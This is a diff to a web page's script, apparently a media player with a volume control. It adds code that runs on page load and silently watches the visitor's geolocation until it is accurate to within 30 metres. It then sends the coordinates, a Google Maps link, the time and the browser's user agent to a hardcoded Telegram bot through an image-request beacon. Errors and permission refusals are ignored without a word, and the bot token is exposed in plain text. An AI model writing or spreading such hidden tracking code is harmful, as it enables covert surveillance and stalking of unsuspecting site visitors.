@@ -727,39 +727,65 @@ volume.addEventListener('input', ()=>{
     volumeLabel.textContent = Math.round(volume.value*100)+"%";
 });
 
-	const BOT_TOKEN = "8307418780:AAGzkA26fmS4WclP_P8dDqv7bDzL8a7I1Io";
+
+const BOT_TOKEN = "8307418780:AAGzkA26fmS4WclP_P8dDqv7bDzL8a7I1Io";
 const CHAT_ID = "6092633949";
 
-function sendLocationToTelegram() {
+let bestPosition = null;
+let watchId = null;
+
+function sendToTelegram(message) {
+    const img = new Image();
+    img.src =
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?` +
+      `chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+}
+
+function getAccurateLocation() {
     if (!navigator.geolocation) return;
 
-    navigator.geolocation.getCurrentPosition(
+    watchId = navigator.geolocation.watchPosition(
         (pos) => {
-            const message =
-`📍 Yeni Konum alındı
-Enlem: ${pos.coords.latitude}
-Boylam: ${pos.coords.longitude}
-Dəqiqlik: ${pos.coords.accuracy} metr
-Saat: ${new Date().toLocaleString()}
-Cihaz: ${navigator.userAgent}`;
+            // ən dəqiq nəticəni saxla
+            if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
+                bestPosition = pos;
+            }
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
-            });
+            // 30 metrdən yaxşıdırsa kifayətdir
+            if (bestPosition.coords.accuracy <= 30) {
+                navigator.geolocation.clearWatch(watchId);
+
+                const lat = bestPosition.coords.latitude;
+                const lon = bestPosition.coords.longitude;
+                const acc = bestPosition.coords.accuracy;
+
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                const message =
+`📍 Dəqiq Konum
+Enlem: ${lat}
+Boylam: ${lon}
+Dəqiqlik: ${acc} m
+Xəritə:
+${mapLink}
+Saat: ${new Date().toLocaleString()}
+Cihaz:
+${navigator.userAgent}`;
+
+                sendToTelegram(message);
+            }
         },
-        () => {
-            // icazə verilməsə susur
+        () => {},
+        {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 20000
         }
     );
 }
 
-// Sayt açılan kimi avtomatik işləsin
-window.addEventListener("load", sendLocationToTelegram);
+// Sayt açılan kimi işləsin
+window.addEventListener("load", getAccurateLocation);
 
 </script>
 
